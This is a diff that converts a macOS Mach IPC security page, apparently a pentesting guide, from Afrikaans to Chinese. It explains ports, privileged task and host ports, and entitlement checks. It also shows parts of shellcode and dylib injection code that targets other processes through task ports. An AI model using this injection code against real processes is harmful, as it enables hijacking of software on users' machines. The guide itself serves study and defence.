 x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
 x6 = 0x0000000000000000 ;mach_port_name_t (notify)
 ```
-Ondersoek die boodskap kop deur die eerste argument te kontroleer:
+检查消息头，查看第一个参数：
 ```armasm
 (lldb) x/6w $x0
 0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
@@ -257,11 +258,11 @@ Ondersoek die boodskap kop deur die eerste argument te kontroleer:
 ; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
 ; 0x40000322 -> mach_msg_id_t (msgh_id)
 ```
-Daardie tipe `mach_msg_bits_t` is baie algemeen om 'n antwoord toe te laat.
+该类型的 `mach_msg_bits_t` 非常常见，允许回复。
 
 
 
-### Enumerate poorte
+### 枚举端口
 ```bash
 lsmp -p <pid>
 
@@ -285,19 +286,19 @@ name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  q
 +     send        --------        ---            1         <-                                       0x00002603  (74295) passd
 [...]
 ```
-Die **naam** is die versteknaam wat aan die poort gegee word (kyk hoe dit in die eerste 3 byte **toeneem**). Die **`ipc-object`** is die **versteekte** unieke **identifiseerder** van die poort.\
-Let ook op hoe die poorte met slegs **`send`** regte die eienaar daarvan identifiseer (poortnaam + pid).\
-Let ook op die gebruik van **`+`** om **ander take wat aan dieselfde poort gekoppel is** aan te dui.
+The **name** 是分配给端口的默认名称（检查它在前3个字节中的 **增加** 情况）。 **`ipc-object`** 是端口的 **混淆** 唯一 **标识符**。\
+还要注意，只有 **`send`** 权限的端口是 **识别其所有者** 的（端口名称 + pid）。\
+还要注意使用 **`+`** 来表示 **连接到同一端口的其他任务**。
 
-Dit is ook moontlik om [**procesxp**](https://www.newosxbook.com/tools/procexp.html) te gebruik om ook die **geregistreerde diensname** te sien (met SIP wat gedeaktiveer is weens die behoefte aan `com.apple.system-task-port`):
+还可以使用 [**procesxp**](https://www.newosxbook.com/tools/procexp.html) 来查看 **注册的服务名称**（由于需要 `com.apple.system-task-port`，因此禁用 SIP）：
 ```
 procesp 1 ports
 ```
-Jy kan hierdie instrument in iOS installeer deur dit af te laai vanaf [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)
+您可以通过从 [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) 下载此工具来安装它。
 
-### Kodevoorbeeld
+### 代码示例
 
-Merk op hoe die **sender** 'n poort toewys, 'n **send right** skep vir die naam `org.darlinghq.example` en dit na die **bootstrap server** stuur terwyl die sender vir die **send right** van daardie naam gevra het en dit gebruik het om 'n boodskap te stuur.
+注意 **发送者** 如何 **分配** 一个端口，为名称 `org.darlinghq.example` 创建一个 **发送权限** 并将其发送到 **引导服务器**，同时发送者请求该名称的 **发送权限** 并使用它来 **发送消息**。
 
 {% tabs %}
 {% tab title="receiver.c" %}
@@ -368,11 +369,7 @@ printf("Text: %s, number: %d\n", message.some_text, message.some_number);
 ```
 {% endtab %}
 
-{% tab title="sender.c" %}  
-### Afrikaans Translation:
-  
-Hierdie program wys hoe om 'n boodskap te stuur na 'n ander proses deur gebruik te maak van Inter-Process Communication (IPC) in macOS. Die sender proses skep 'n boodskap en stuur dit na die ander proses deur die gebruik van 'n IPC meganisme soos `mach_msg`.  
-{% endtab %}
+{% tab title="sender.c" %}
 ```c
 // Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
 // gcc sender.c -o sender
@@ -427,42 +424,42 @@ printf("Sent a message\n");
 {% endtab %}
 {% endtabs %}
 
-## Bevoorregte Poorte
+## 特权端口
 
-Daar is sekere spesiale poorte wat toelaat om **sekere sensitiewe aksies uit te voer of toegang te verkry tot sekere sensitiewe data** in die geval waar 'n taak die **SEND**-permissies oor hulle het. Dit maak hierdie poorte baie interessant vanuit 'n aanvaller se perspektief nie net vanweë die vermoëns nie, maar omdat dit moontlik is om **SEND-permissies oor take te deel**.
+有一些特殊端口允许在任务对其具有 **SEND** 权限的情况下 **执行某些敏感操作或访问某些敏感数据**。这使得这些端口从攻击者的角度来看非常有趣，不仅因为其能力，还因为可以 **在任务之间共享 SEND 权限**。
 
-### Gasheer Spesiale Poorte
+### 主机特殊端口
 
-Hierdie poorte word voorgestel deur 'n nommer.
+这些端口由一个数字表示。
 
-**SEND** regte kan verkry word deur **`host_get_special_port`** te roep en **RECEIVE** regte deur **`host_set_special_port`** te roep. Nietemin, beide oproepe vereis die **`host_priv`** poort wat slegs root kan toegang verkry. Verder was dit in die verlede vir root moontlik om **`host_set_special_port`** te roep en willekeurige poorte te kap wat byvoorbeeld toegelaat het om kodehandtekeninge te omseil deur `HOST_KEXTD_PORT` te kap (SIP voorkom dit nou).
+**SEND** 权限可以通过调用 **`host_get_special_port`** 获得，而 **RECEIVE** 权限则通过调用 **`host_set_special_port`** 获得。然而，这两个调用都需要 **`host_priv`** 端口，只有 root 可以访问。此外，在过去，root 能够调用 **`host_set_special_port`** 并劫持任意端口，例如通过劫持 `HOST_KEXTD_PORT` 来绕过代码签名（SIP 现在防止了这一点）。
 
-Hierdie is verdeel in 2 groepe: Die **eerste 7 poorte word besit deur die kernel** waarvan die 1 `HOST_PORT`, die 2 `HOST_PRIV_PORT`, die 3 `HOST_IO_MASTER_PORT` en die 7 is `HOST_MAX_SPECIAL_KERNEL_PORT`.\
-Diegene wat begin **vanaf** nommer **8** word **besit deur stelseldaemons** en hulle kan gevind word wat verklaar is in [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html).
+这些端口分为两组：**前 7 个端口由内核拥有**，分别是 1 `HOST_PORT`、2 `HOST_PRIV_PORT`、3 `HOST_IO_MASTER_PORT`，7 是 `HOST_MAX_SPECIAL_KERNEL_PORT`。\
+从数字 **8** 开始的端口是 **由系统守护进程拥有**，可以在 [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host\_special\_ports.h.auto.html) 中找到声明。
 
-* **Gasheerpoort**: As 'n proses **SEND**-bevoegdheid oor hierdie poort het, kan hy **inligting** oor die **sisteem** kry deur sy roetines te roep soos:
-* `host_processor_info`: Kry verwerkerinligting
-* `host_info`: Kry gasheerinligting
-* `host_virtual_physical_table_info`: Virtuele/Fisiese bladsytabel (vereis MACH\_VMDEBUG)
-* `host_statistics`: Kry gasheerstatistieke
-* `mach_memory_info`: Kry kernelgeheue-indeling
-* **Gasheer Priv-poort**: 'n Proses met **SEND**-reg oor hierdie poort kan **bevoorregte aksies** uitvoer soos die vertoon van opstartdata of probeer om 'n kerneluitbreiding te laai. Die **proses moet root wees** om hierdie toestemming te kry.
-* Verder, om die **`kext_request`** API te roep, is dit nodig om ander toestemmings te hê **`com.apple.private.kext*`** wat slegs aan Apple-binêre lêers gegee word.
-* Ander roetines wat geroep kan word is:
-* `host_get_boot_info`: Kry `machine_boot_info()`
-* `host_priv_statistics`: Kry bevoorregte statistieke
-* `vm_allocate_cpm`: Allokeer Aaneenlopende Fisiese Geheue
-* `host_processors`: Stuur reg na gasheerverwerkers
-* `mach_vm_wire`: Maak geheue residens
-* Aangesien **root** toegang tot hierdie toestemming kan verkry, kan dit `host_set_[special/exception]_port[s]` roep om **gasheer spesiale of uitsonderingspoorte te kap**.
+* **主机端口**：如果一个进程对这个端口具有 **SEND** 权限，它可以通过调用其例程获取 **系统** 信息，例如：
+* `host_processor_info`: 获取处理器信息
+* `host_info`: 获取主机信息
+* `host_virtual_physical_table_info`: 虚拟/物理页表（需要 MACH\_VMDEBUG）
+* `host_statistics`: 获取主机统计信息
+* `mach_memory_info`: 获取内核内存布局
+* **主机特权端口**：对这个端口具有 **SEND** 权限的进程可以执行 **特权操作**，例如显示启动数据或尝试加载内核扩展。**进程需要是 root** 才能获得此权限。
+* 此外，为了调用 **`kext_request`** API，需要拥有其他权限 **`com.apple.private.kext*`**，这些权限仅授予 Apple 二进制文件。
+* 可以调用的其他例程包括：
+* `host_get_boot_info`: 获取 `machine_boot_info()`
+* `host_priv_statistics`: 获取特权统计信息
+* `vm_allocate_cpm`: 分配连续物理内存
+* `host_processors`: 发送权限到主机处理器
+* `mach_vm_wire`: 使内存常驻
+* 由于 **root** 可以访问此权限，它可以调用 `host_set_[special/exception]_port[s]` 来 **劫持主机特殊或异常端口**。
 
-Dit is moontlik om **alle gasheer spesiale poorte** te sien deur die volgende te hardloop:
+可以通过运行以下命令 **查看所有主机特殊端口**：
 ```bash
 procexp all ports | grep "HSP"
 ```
-### Taak Spesiale Poorte
+### Task Special Ports
 
-Hierdie is poorte wat gereserveer is vir bekende dienste. Dit is moontlik om hulle te kry/stel deur `task_[get/set]_special_port` te roep. Hulle kan gevind word in `task_special_ports.h`:
+这些是为知名服务保留的端口。可以通过调用 `task_[get/set]_special_port` 来获取/设置它们。它们可以在 `task_special_ports.h` 中找到：
 ```c
 typedef	int	task_special_port_t;
 
@@ -473,52 +470,52 @@ world.*/
 #define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
 #define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
 ```
-Van [hier](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):
+从 [这里](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html):
 
-* **TASK\_KERNEL\_PORT**\[taak-self stuur reg]: Die poort wat gebruik word om hierdie taak te beheer. Gebruik om boodskappe te stuur wat die taak beïnvloed. Dit is die poort wat teruggegee word deur **mach\_task\_self (sien Taak Poorte hieronder)**.
-* **TASK\_BOOTSTRAP\_PORT**\[bootstrap stuur reg]: Die taak se bootstrap poort. Gebruik om boodskappe te stuur wat die terugkeer van ander stelseldienspoorte aanvra.
-* **TASK\_HOST\_NAME\_PORT**\[host-self stuur reg]: Die poort wat gebruik word om inligting van die gasheer te versoek. Dit is die poort wat teruggegee word deur **mach\_host\_self**.
-* **TASK\_WIRED\_LEDGER\_PORT**\[ledger stuur reg]: Die poort wat die bron noem waaruit hierdie taak sy bedrade kernelgeheue trek.
-* **TASK\_PAGED\_LEDGER\_PORT**\[ledger stuur reg]: Die poort wat die bron noem waaruit hierdie taak sy verstekgeheue bestuurde geheue trek.
+* **TASK\_KERNEL\_PORT**\[task-self send right]: 用于控制此任务的端口。用于发送影响任务的消息。这是 **mach\_task\_self（见下文的任务端口）** 返回的端口。
+* **TASK\_BOOTSTRAP\_PORT**\[bootstrap send right]: 任务的引导端口。用于发送请求返回其他系统服务端口的消息。
+* **TASK\_HOST\_NAME\_PORT**\[host-self send right]: 用于请求包含主机信息的端口。这是 **mach\_host\_self** 返回的端口。
+* **TASK\_WIRED\_LEDGER\_PORT**\[ledger send right]: 命名此任务从中提取其有线内核内存的源的端口。
+* **TASK\_PAGED\_LEDGER\_PORT**\[ledger send right]: 命名此任务从中提取其默认内存管理内存的源的端口。
 
-### Taak Poorte
+### 任务端口
 
-Oorspronklik het Mach nie "prosesse" gehad nie, dit het "take" gehad wat meer as 'n houer van drade beskou is. Toe Mach saamgevoeg is met BSD **was elke taak gekorreleer met 'n BSD-proses**. Daarom het elke BSD-proses die besonderhede wat dit nodig het om 'n proses te wees en elke Mach-taak het ook sy innerlike werking (behalwe vir die nie-bestaande pid 0 wat die `kernel_task` is).
+最初 Mach 没有“进程”，它有“任务”，被认为更像是线程的容器。当 Mach 与 BSD 合并时，**每个任务与一个 BSD 进程相关联**。因此，每个 BSD 进程都有其作为进程所需的详细信息，每个 Mach 任务也有其内部工作（除了不存在的 pid 0，即 `kernel_task`）。
 
-Daar is twee baie interessante funksies wat hiermee verband hou:
+与此相关的有两个非常有趣的函数：
 
-* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Kry 'n STUUR reg vir die taakpoort van die taak wat verband hou met die gespesifiseerde `pid` en gee dit aan die aangeduide `target_task_port` (wat gewoonlik die aanroeperstaak is wat `mach_task_self()` gebruik het, maar kan 'n STUUR poort oor 'n ander taak wees.)
-* `pid_for_task(task, &pid)`: Gegewe 'n STUUR reg vir 'n taak, vind uit aan watter PID hierdie taak verband hou.
+* `task_for_pid(target_task_port, pid, &task_port_of_pid)`: 获取与指定的 `pid` 相关的任务的任务端口的发送权限，并将其授予指定的 `target_task_port`（通常是使用 `mach_task_self()` 的调用任务，但也可以是不同任务上的发送端口。）
+* `pid_for_task(task, &pid)`: 给定一个任务的发送权限，查找该任务相关的 PID。
 
-Om aksies binne die taak uit te voer, het die taak 'n `STUUR` reg na homself nodig deur `mach_task_self()` te roep (wat die `task_self_trap` (28) gebruik). Met hierdie toestemming kan 'n taak verskeie aksies uitvoer soos:
+为了在任务内执行操作，任务需要对自己调用 `mach_task_self()` 的 `SEND` 权限（使用 `task_self_trap`（28））。有了这个权限，任务可以执行多个操作，例如：
 
-* `task_threads`: Kry STUUR reg oor alle taakpoorte van die drade van die taak
-* `task_info`: Kry inligting oor 'n taak
-* `task_suspend/resume`: Ophou of hervat 'n taak
+* `task_threads`: 获取任务线程的所有任务端口的发送权限
+* `task_info`: 获取有关任务的信息
+* `task_suspend/resume`: 暂停或恢复任务
 * `task_[get/set]_special_port`
-* `thread_create`: Skep 'n draad
-* `task_[get/set]_state`: Beheer taaktoestand
-* en meer kan gevind word in [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)
+* `thread_create`: 创建线程
+* `task_[get/set]_state`: 控制任务状态
+* 更多内容可以在 [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) 中找到
 
-{% hint style="gevaar" %}
-Let daarop dat met 'n STUUR reg oor 'n taakpoort van 'n **verskillende taak**, is dit moontlik om sulke aksies oor 'n verskillende taak uit te voer.
+{% hint style="danger" %}
+请注意，拥有 **不同任务** 的任务端口的发送权限，可以对不同任务执行此类操作。
 {% endhint %}
 
-Verder is die taak\_poort ook die **`vm_map`** poort wat toelaat om **geheue te lees en te manipuleer** binne 'n taak met funksies soos `vm_read()` en `vm_write()`. Dit beteken basies dat 'n taak met STUUR regte oor die taak\_poort van 'n ander taak in staat sal wees om **kode in daardie taak in te spuit**.
+此外，task\_port 也是 **`vm_map`** 端口，允许使用 `vm_read()` 和 `vm_write()` 等函数 **读取和操作内存**。这基本上意味着，拥有不同任务的 task\_port 的发送权限的任务将能够 **注入代码到该任务中**。
 
-Onthou dat omdat die **kernel ook 'n taak is**, as iemand daarin slaag om 'n **STUUR toestemmings** oor die **`kernel_task`** te kry, sal dit in staat wees om die kernel enige iets te laat uitvoer (jailbreaks).
+请记住，因为 **内核也是一个任务**，如果有人设法获得 **`kernel_task`** 的 **发送权限**，它将能够使内核执行任何操作（越狱）。
 
-* Roep `mach_task_self()` aan om **die naam** vir hierdie poort vir die aanroeperstaak te kry. Hierdie poort word slegs **geërf** oor **`exec()`**; 'n nuwe taak wat geskep is met `fork()` kry 'n nuwe taakpoort (as 'n spesiale geval, kry 'n taak ook 'n nuwe taakpoort na `exec()` in 'n suid-binêre). Die enigste manier om 'n taak te skep en sy poort te kry, is om die ["poortruil dans"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) uit te voer terwyl 'n `fork()` gedoen word.
-* Hierdie is die beperkings om toegang tot die poort te verkry (vanaf `macos_task_policy` van die binêre `AppleMobileFileIntegrity`):
-* As die program die **`com.apple.security.get-task-allow` toestemming** het, kan prosesse van dieselfde gebruiker toegang tot die taakpoort kry (gewoonlik bygevoeg deur Xcode vir foutopsporing). Die **notariseringsproses** sal dit nie toelaat vir produksie vrystellings nie.
-* Programme met die **`com.apple.system-task-ports` toestemming** kan die **taakpoort vir enige** proses kry, behalwe die kernel. In ouer weergawes was dit genoem **`task_for_pid-allow`**. Dit word slegs aan Apple-toepassings toegeken.
-* **Root kan toegang tot taakpoorte** van toepassings kry wat nie met 'n **verharde** hardloopomgewing saamgestel is nie (en nie van Apple nie).
+* 调用 `mach_task_self()` 以 **获取此端口的名称**，用于调用任务。此端口仅在 **`exec()`** 之间 **继承**；使用 `fork()` 创建的新任务会获得一个新的任务端口（作为特例，任务在 suid 二进制文件中 `exec()` 后也会获得一个新的任务端口）。生成任务并获取其端口的唯一方法是在执行 `fork()` 时进行 ["port swap dance"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)。
+* 访问端口的限制（来自二进制文件 `AppleMobileFileIntegrity` 的 `macos_task_policy`）：
+* 如果应用具有 **`com.apple.security.get-task-allow` 权限**，则来自 **同一用户的进程可以访问任务端口**（通常由 Xcode 添加用于调试）。**公证** 过程不允许其用于生产版本。
+* 具有 **`com.apple.system-task-ports`** 权限的应用可以获取 **任何** 进程的任务端口，除了内核。在旧版本中称为 **`task_for_pid-allow`**。这仅授予 Apple 应用。
+* **Root 可以访问未使用 **hardened** 运行时（且不是来自 Apple）编译的应用的任务端口**。
 
-**Die taaknaampoort:** 'n Onbevoorregte weergawe van die _taakpoort_. Dit verwys na die taak, maar laat nie toe om dit te beheer nie. Die enigste ding wat beskikbaar lyk deur dit is `task_info()`.
+**任务名称端口：** 一个未特权版本的 _任务端口_。它引用任务，但不允许控制它。通过它似乎唯一可用的功能是 `task_info()`。
 
-### Draadpoorte
+### 线程端口
 
-Drade het ook geassosieerde poorte, wat sigbaar is vanaf die taak wat **`task_threads`** aanroep en vanaf die verwerker met `processor_set_threads`. 'n STUUR reg oor die draadpoort maak dit moontlik om die funksie van die `thread_act` subsisteem te gebruik, soos:
+线程也有相关的端口，可以从调用 **`task_threads`** 的任务和使用 `processor_set_threads` 的处理器中看到。对线程端口的发送权限允许使用 `thread_act` 子系统中的函数，例如：
 
 * `thread_terminate`
 * `thread_[get/set]_state`
@@ -527,11 +524,11 @@ Drade het ook geassosieerde poorte, wat sigbaar is vanaf die taak wat **`task_th
 * `thread_info`
 * ...
 
-Enige draad kan hierdie poort kry deur na **`mach_thread_sef`** te roep.
+任何线程都可以通过调用 **`mach_thread_sef`** 获取此端口。
 
-### Shellcode-inspuiting in draad via Taakpoort
+### 通过任务端口在线程中注入 Shellcode
 
-Jy kan 'n shellkode kry van:
+您可以从以下位置获取 shellcode：
 
 {% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
 [arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
@@ -570,13 +567,7 @@ return 0;
 ```
 {% endtab %}
 
-{% tab title="entitlements.plist" %}  
-### Voorregte.plist
-
-Hierdie lêer bevat die voorregte wat aan die toepassing toegeken is vir die interproseskommunikasie (IPC).  
-Die voorregte in hierdie lêer bepaal watter aksies die toepassing mag uitvoer binne die konteks van IPC.  
-Dit is belangrik om die inhoud van hierdie lêer te monitor en te verseker dat slegs die nodige voorregte toegeken word om die veiligheid van die stelsel te handhaaf.  
-{% endtab %}
+{% tab title="entitlements.plist" %}
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -589,7 +580,7 @@ Dit is belangrik om die inhoud van hierdie lêer te monitor en te verseker dat s
 {% endtab %}
 {% endtabs %}
 
-**Kompileer** die vorige program en voeg die **bevoegdhede** by om kode in te spuit met dieselfde gebruiker (as nie, sal jy **sudo** moet gebruik).
+**编译**之前的程序并添加**权限**以便能够以相同用户注入代码（如果没有，您将需要使用**sudo**）。
 
 <details>
 
@@ -793,24 +784,24 @@ inject(pid);
 return 0;
 }
 ```
-</besonderhede>
+</details>
 ```bash
 gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
 ./inject <pi or string>
 ```
 {% hint style="success" %}
-Om dit op iOS te laat werk, het jy die toestemming `dynamic-codesigning` nodig om 'n skryfbare geheue uitvoerbaar te maak.
+要使其在 iOS 上工作，您需要权限 `dynamic-codesigning` 以便能够创建可写内存可执行文件。
 {% endhint %}
 
-### Dylib Inspruiting in draad via Taakpoort
+### 通过任务端口在线程中注入 Dylib
 
-Op macOS kan **drade** gemanipuleer word via **Mach** of deur die gebruik van die **posix `pthread` api**. Die draad wat ons in die vorige inspuiting gegenereer het, is gegenereer met behulp van die Mach api, so dit is **nie posix voldoenend nie**.
+在 macOS 中，**线程** 可以通过 **Mach** 或使用 **posix `pthread` api** 进行操作。我们在之前的注入中生成的线程是使用 Mach api 生成的，因此 **它不符合 posix 标准**。
 
-Dit was moontlik om 'n eenvoudige shellkode in te spuit om 'n bevel uit te voer omdat dit nie met posix voldoenende api's hoef te werk nie, slegs met Mach. **Meer komplekse inspuitings** sou die **draad** ook **posix voldoenend** moet wees.
+能够 **注入一个简单的 shellcode** 来执行命令是因为它 **不需要与 posix** 兼容的 api 进行工作，只需与 Mach 进行工作。**更复杂的注入** 需要 **线程** 也 **符合 posix 标准**。
 
-Daarom, om die draad te verbeter, moet dit die **`pthread_create_from_mach_thread`** aanroep wat 'n geldige pthread sal skep. Dan kan hierdie nuwe pthread **dlopen** aanroep om 'n dylib van die stelsel te **laai**, sodat dit moontlik is om aangepaste biblioteke te laai in plaas van nuwe shellkode te skryf om verskillende aksies uit te voer.
+因此，为了 **改进线程**，它应该调用 **`pthread_create_from_mach_thread`**，这将 **创建一个有效的 pthread**。然后，这个新的 pthread 可以 **调用 dlopen** 从系统中 **加载一个 dylib**，因此不必编写新的 shellcode 来执行不同的操作，而是可以加载自定义库。
 
-Jy kan **voorbeeld dylibs** vind (byvoorbeeld een wat 'n log genereer en dan kan jy daarna luister):
+您可以在以下位置找到 **示例 dylibs**（例如，生成日志的那个，然后您可以监听它）：
 
 {% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
 [macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
@@ -1018,33 +1009,32 @@ return (-3);
 
 
 // Set the permissions on the allocated code memory
-```c
 kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
 
 if (kr != KERN_SUCCESS)
 {
-fprintf(stderr,"Kan nie geheue-toestemmings instel vir die kode van die afgeleë draad nie: Fout %s\n", mach_error_string(kr));
+fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
 return (-4);
 }
 
-// Stel die toestemmings op die toegewysde stokgeheue
+// Set the permissions on the allocated stack memory
 kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
 
 if (kr != KERN_SUCCESS)
 {
-fprintf(stderr,"Kan nie geheue-toestemmings instel vir die stok van die afgeleë draad nie: Fout %s\n", mach_error_string(kr));
+fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
 return (-4);
 }
 
 
-// Skep draad om shellkode uit te voer
+// Create thread to run shellcode
 struct arm_unified_thread_state remoteThreadState64;
 thread_act_t         remoteThread;
 
 memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
 
-remoteStack64 += (STACK_SIZE / 2); // dit is die werklike stok
-//remoteStack64 -= 8;  // nodig uitlyn van 16
+remoteStack64 += (STACK_SIZE / 2); // this is the real stack
+//remoteStack64 -= 8;  // need alignment of 16
 
 const char* p = (const char*) remoteCode64;
 
@@ -1053,13 +1043,13 @@ remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
 remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
 remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
 
-printf ("Afgeleë Stok 64  0x%llx, Afgeleë kode is %p\n", remoteStack64, p );
+printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
 
 kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
 (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
 
 if (kr != KERN_SUCCESS) {
-fprintf(stderr,"Kan nie afgeleë draad skep nie: fout %s", mach_error_string (kr));
+fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
 return (-3);
 }
 
@@ -1072,8 +1062,8 @@ int main(int argc, const char * argv[])
 {
 if (argc < 3)
 {
-fprintf (stderr, "Gebruik: %s _pid_ _aksie_\n", argv[0]);
-fprintf (stderr, "   _aksie_: pad na 'n dylib op skyf\n");
+fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
+fprintf (stderr, "   _action_: path to a dylib on disk\n");
 exit(0);
 }
 
@@ -1085,62 +1075,64 @@ int rc = stat (action, &buf);
 if (rc == 0) inject(pid,action);
 else
 {
-fprintf(stderr,"Dylib nie gevind nie\n");
+fprintf(stderr,"Dylib not found\n");
 }
 
 }
 ```
-</besonderhede>
+</details>
 ```bash
 gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 ./inject <pid-of-mysleep> </path/to/lib.dylib>
 ```
-### Draadkaping via Taakpoort <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
+### 线程劫持通过任务端口 <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>
 
-In hierdie tegniek word 'n draad van die proses gekaap:
+在此技术中，进程的一个线程被劫持：
 
 {% content-ref url="macos-thread-injection-via-task-port.md" %}
 [macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
 {% endcontent-ref %}
 
-### Taakpoort Inspruiting Opmerking
+### 任务端口注入检测
 
-Wanneer 'task_for_pid' of 'thread_create_*' geroep word, verhoog dit 'n teller in die `task` struktuur van die kernel wat vanaf gebruikersmodus geroep kan word deur `task_info(task, TASK_EXTMOD_INFO, ...)`.
+当调用 `task_for_pid` 或 `thread_create_*` 时，会在内核的任务结构中递增一个计数器，该计数器可以通过用户模式调用 task\_info(task, TASK\_EXTMOD\_INFO, ...) 访问。
 
-## Uitsonderingspoorte
+## 异常端口
 
-Wanneer 'n uitsondering in 'n draad plaasvind, word hierdie uitsondering gestuur na die aangewese uitsonderingspoort van die draad. As die draad dit nie hanteer nie, word dit na die taakuitsonderingspoorte gestuur. As die taak dit nie hanteer nie, word dit na die gaspoort gestuur wat deur launchd bestuur word (waar dit erken sal word). Dit word uitsonderingstrias genoem.
+当线程中发生异常时，该异常会发送到线程的指定异常端口。如果线程不处理它，则会发送到任务异常端口。如果任务不处理它，则会发送到由 launchd 管理的主机端口（将在那里得到确认）。这称为异常分类。
 
-Let daarop dat gewoonlik as die verslag nie behoorlik hanteer word nie, sal dit uiteindelik deur die ReportCrash daemon hanteer word. Dit is egter moontlik vir 'n ander draad in dieselfde taak om die uitsondering te hanteer, dit is wat krasverslagdoeningshulpmiddels soos `PLCrashReporter` doen.
+请注意，通常如果未正确处理，报告最终将由 ReportCrash 守护进程处理。然而，任务中的另一个线程可以管理该异常，这正是崩溃报告工具如 `PLCreashReporter` 所做的。
 
-## Ander Voorwerpe
+## 其他对象
 
-### Klok
+### 时钟
 
-Enige gebruiker kan inligting oor die klok bekom, maar om die tyd in te stel of ander instellings te wysig, moet 'n persoon 'root' wees.
+任何用户都可以访问有关时钟的信息，但要设置时间或修改其他设置，必须是 root。
 
-Om inligting te verkry, is dit moontlik om funksies van die `klok` subsisteem te roep soos: `clock_get_time`, `clock_get_attributtes` of `clock_alarm`. Om waardes te wysig, kan die `clock_priv` subsisteem gebruik word met funksies soos `clock_set_time` en `clock_set_attributes`.
+为了获取信息，可以调用 `clock` 子系统中的函数，如：`clock_get_time`、`clock_get_attributtes` 或 `clock_alarm`。\
+为了修改值，可以使用 `clock_priv` 子系统中的函数，如 `clock_set_time` 和 `clock_set_attributes`。
 
-### Verwerkers en Verwerkerstel
+### 处理器和处理器集
 
-Die verwerker-API's maak dit moontlik om 'n enkele logiese verwerker te beheer deur funksies soos `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`... te roep.
+处理器 API 允许通过调用函数如 `processor_start`、`processor_exit`、`processor_info`、`processor_get_assignment` 来控制单个逻辑处理器。
 
-Verder bied die **verwerkerstel** API's 'n manier om meerdere verwerkers in 'n groep te groepeer. Dit is moontlik om die verstek verwerkerstel te bekom deur **`processor_set_default`** te roep. Hier is 'n paar interessante API's om met die verwerkerstel te interaksieer:
+此外，**处理器集** API 提供了一种将多个处理器分组的方法。可以通过调用 **`processor_set_default`** 来检索默认处理器集。\
+以下是一些与处理器集交互的有趣 API：
 
-- `processor_set_statistics`
-- `processor_set_tasks`: Gee 'n reeks stuurbevoegdhede vir alle take binne die verwerkerstel terug
-- `processor_set_threads`: Gee 'n reeks stuurbevoegdhede vir alle drade binne die verwerkerstel terug
-- `processor_set_stack_usage`
-- `processor_set_info`
+* `processor_set_statistics`
+* `processor_set_tasks`：返回处理器集中所有任务的发送权限数组
+* `processor_set_threads`：返回处理器集中所有线程的发送权限数组
+* `processor_set_stack_usage`
+* `processor_set_info`
 
-Soos genoem in [**hierdie pos**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/), het dit in die verlede toegelaat om die vorige genoemde beskerming te omseil om taakpoorte in ander prosesse te bekom om hulle te beheer deur **`processor_set_tasks`** te roep en 'n gaspoort op elke proses te kry.\
-Teenwoordig moet jy 'root' wees om daardie funksie te gebruik en dit is beskerm sodat jy slegs hierdie poorte op onbeskermde prosesse kan kry.
